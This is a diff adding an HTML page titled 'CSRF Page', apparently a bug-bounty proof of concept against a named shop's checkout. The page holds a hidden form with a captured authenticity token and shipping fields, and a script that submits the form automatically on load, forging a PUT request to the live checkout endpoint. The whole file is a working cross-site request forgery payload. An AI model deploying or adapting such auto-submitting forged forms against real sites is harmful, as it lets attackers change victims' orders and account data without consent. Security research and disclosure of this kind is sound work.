@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Page</title>
+</head>
+<body>
+    <form id="csrfForm" action="https://hukitchen.com/12698457/checkouts/1624daa68b6f0091b90990176f507b8c" method="POST">
+        <input type="hidden" name="_method" value="put">
+        <input type="hidden" name="authenticity_token" value="p5_dbzm3h16vaj6XqjBgT-YjhY91rr-TSF5O_gykE3caEusWym9uf7mO0D7ryy-vG0BJmBlwsEpsNdaeEvBppw">
+        <input type="hidden" name="previous_step" value="contact_information">
+        <input type="hidden" name="step" value="shipping_method">
+        <input type="hidden" name="checkout[email]" value="trib0rg_2+test2@wearehackerone.com">
+        <input type="hidden" name="checkout[buyer_accepts_marketing]" value="1">
+        <input type="hidden" name="checkout[shipping_address][first_name]" value="heller">
+        <input type="hidden" name="checkout[shipping_address][last_name]" value="hunt">
+        <input type="hidden" name="checkout[shipping_address][company]" value="LOLLLLHAKCERONE">
+        <input type="hidden" name="checkout[shipping_address][address1]" value="Loop">
+        <input type="hidden" name="checkout[shipping_address][address2]" value="90779">
+        <input type="hidden" name="checkout[shipping_address][city]" value="Loop">
+        <input type="hidden" name="checkout[shipping_address][country]" value="United States">
+        <input type="hidden" name="checkout[shipping_address][province]" value="TX">
+        <input type="hidden" name="checkout[shipping_address][zip]" value="79342">
+        <input type="hidden" name="checkout[shipping_address][phone]" value="90889776547">
+        <input type="hidden" name="ps_accepts_sms" value="on">
+        <input type="hidden" name="checkout[client_details][browser_width]" value="1903">
+        <input type="hidden" name="checkout[client_details][browser_height]" value="947">
+        <input type="hidden" name="checkout[client_details][javascript_enabled]" value="1">
+        <input type="hidden" name="checkout[client_details][color_depth]" value="24">
+        <input type="hidden" name="checkout[client_details][java_enabled]" value="false">
+        <input type="hidden" name="checkout[client_details][browser_tz]" value="-330">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
